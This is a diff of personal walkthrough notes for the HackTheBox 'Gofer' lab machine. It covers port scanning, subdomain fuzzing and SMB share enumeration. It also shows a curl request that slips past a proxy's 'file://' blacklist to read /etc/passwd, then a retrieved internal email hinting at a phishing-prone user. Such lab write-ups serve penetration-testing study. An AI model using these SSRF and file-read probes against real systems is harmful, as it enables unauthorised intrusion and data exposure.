@@ -1,5 +1,5 @@
 gofer 10.10.11.225
----
+
 nmap -p- --min-rate 4000 10.10.11.225
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 08:22 CEST
 Nmap scan report for 10.10.11.225
@@ -10,9 +10,9 @@ PORT    STATE SERVICE
 80/tcp  open  http
 139/tcp open  netbios-ssn
 445/tcp open  microsoft-ds
----
+
 nmap -p 80,139,445 -sC -sV --min-rate 3000 10.10.11.225
----
+
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 08:26 CEST
 Nmap scan report for 10.10.11.225
 Host is up (0.12s latency).
@@ -38,9 +38,14 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 16.23 seconds
 
----
 echo "10.10.11.225 gofer.htb" | sudo tee -a /etc/hosts
----
+
+**Corporate website**
+Jeff Davis - Chief Executive Officer 
+Jocelyn Hudson - Product Manager 
+Tom Buckley - CTO 
+Amanda Blake - Accountant 
+
 wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 400,301 -H 'Host:FUZZ.gofer.htb' http://gofer.htb
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
@@ -50,27 +55,32 @@ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.
 Target: http://gofer.htb/
 Total requests: 220560
 
-=====================================================================
+'=====================================================================
 ID           Response   Lines    Word       Chars       Payload                                                                     
-=====================================================================
+'=====================================================================
 
 000001171:   401        14 L     54 W       462 Ch      "proxy" 
----
-$curl -X POST http://proxy.gofer.htb/index.php
----
+
+┌─[xbutch@parrot]─[~]
+└──╼ $curl -X POST http://proxy.gofer.htb/index.php
+
 <!-- Welcome to Gofer proxy -->
 <html><body>Missing URL parameter !</body></html>
----
+
 ┌─[xbutch@parrot]─[~]
 └──╼ $curl -X POST -d 'URL=http://10.10.16.26' http://proxy.gofer.htb/index.php
 <!-- Welcome to Gofer proxy -->
-<html><body>Missing URL parameter !</body></html>┌─[xbutch@parrot]─[~]
+<html><body>Missing URL parameter !</body></html>
+
+┌─[xbutch@parrot]─[~]
 └──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=http://10.10.16.26
 <!-- Welcome to Gofer proxy -->
+
 ┌─[xbutch@parrot]─[~]
 └──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=file:///etc/passwd
 <!-- Welcome to Gofer proxy -->
 <html><body>Blacklisted keyword: file:// !</body></html>
+
 ┌─[xbutch@parrot]─[~]
 └──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=file:/etc/passwd
 <!-- Welcome to Gofer proxy -->
@@ -113,7 +123,7 @@ _laurel:x:998:998::/var/log/laurel:/bin/false
         Disk                                                  	Permissions	Comment
 	----                                                  	-----------	-------
 	print$                                            	NO ACCESS	Printer Drivers
-	shares                                            	READ ONLY	
+	**shares**                                            	READ ONLY	
 	IPC$                                              	NO ACCESS	IPC Service (Samba 4.13.13-Debian)
 
 ┌─[xbutch@parrot]─[~]
@@ -137,10 +147,10 @@ getting file \.backup\mail of size 1101 as mail (3,0 KiloBytes/sec) (average 3,0
 
 ┌─[xbutch@parrot]─[~]
 └──╼ $cat mail
-From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022
+From **jdavis@gofer.htb**  Fri Oct 28 20:29:30 2022
 Return-Path: <jdavis@gofer.htb>
 X-Original-To: tbuckley@gofer.htb
-Delivered-To: tbuckley@gofer.htb
+Delivered-To: **tbuckley@gofer.htb**
 Received: from gofer.htb (localhost [127.0.0.1])
         by gofer.htb (Postfix) with SMTP id C8F7461827
         for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
@@ -154,3 +164,5 @@ Hello guys,
 Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an **.odt format**, as documents saved in Office Word are not always well interpreted by Libreoffice.
 
 PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>
+
+https://github.com/tarunkant/Gopherus
